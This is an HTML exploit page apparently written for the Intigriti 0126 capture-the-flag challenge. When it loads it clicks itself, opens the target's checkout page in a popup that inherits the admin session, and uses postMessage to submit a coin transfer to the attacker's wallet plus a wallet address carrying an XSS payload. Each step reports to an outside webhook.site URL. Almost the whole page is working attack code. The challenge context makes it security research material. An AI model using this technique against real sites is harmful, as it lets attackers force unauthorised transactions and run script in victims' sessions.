<!DOCTYPE html>
<html>
<head>
    <title>Intigriti 0126 - XSS Exploit</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
        .btn { background: #238636; color: white; padding: 15px 30px; border: none; font-size: 16px; cursor: pointer; }
        .btn:hover { background: #2ea043; }
    </style>
</head>
<body>
    <h1>EXPLOIT LOADED</h1>
    <div id="log">Starting...</div>

    <!-- Auto-click button for admin bot -->
    <button id="startBtn" class="btn" onclick="startExploit()">Start Exploit</button>

    <script>
        const BASE = 'https://challenge-0126.intigriti.io';
        const WEBHOOK = 'https://webhook.site/f324d507-94fa-4265-8946-2b290873a05e';
        const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';
        const CURRENCY = '1337COIN';
        const XSS_WALLET = '"><img src=x onerror="alert(\'gigawatz\')">';

        function log(msg) {
            document.getElementById('log').innerHTML += '<br>' + msg;
            console.log(msg);
        }

        function track(step, status, data = {}) {
            const url = `${WEBHOOK}?step=${step}&status=${status}&ts=${Date.now()}&d=${encodeURIComponent(JSON.stringify(data))}`;
            fetch(url, { mode: 'no-cors' }).catch(() => {});
        }

        track('start', 'loaded', {});

        function startExploit() {
            log('Opening checkout popup...');
            track('opening_popup', 'start', {});

            // Open checkout in popup - inherits admin session
            const popup = window.open(
                `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`,
                'checkout',
                'width=1000,height=800'
            );

            if (!popup) {
                log('Popup blocked!');
                track('popup_blocked', 'failed', {});
                return;
            }

            log('Popup opened!');
            track('popup_opened', 'success', {});

            // Wait for checkout to fully load (increased timeout)
            setTimeout(() => {
                log('Sending transactions...');
                track('sending', 'start', {});

                // Send both instantly - async handler processes in parallel
                popup.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: YOUR_WALLET,
                        currency: CURRENCY,
                        amount: 1337
                    }
                }, '*');

                track('tx1_sent', 'success', { to: YOUR_WALLET });
                log('TX #1 sent');

                popup.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: XSS_WALLET,
                        currency: CURRENCY,
                        amount: 1337
                    }
                }, '*');

                track('tx2_sent', 'success', { to: XSS_WALLET });
                log('TX #2 sent with XSS');
                log('Waiting for processing...');

            }, 10000); // 10 second wait for page to fully load

            // Listen for any response
            window.addEventListener('message', (event) => {
                log('Message received: ' + JSON.stringify(event.data));
                track('message_received', 'info', event.data);
            });
        }

        // Auto-click for admin bot (1-click exploit)
        window.addEventListener('load', () => {
            setTimeout(() => {
                document.getElementById('startBtn').click();
            }, 500);
        });
    </script>
</body>
</html>
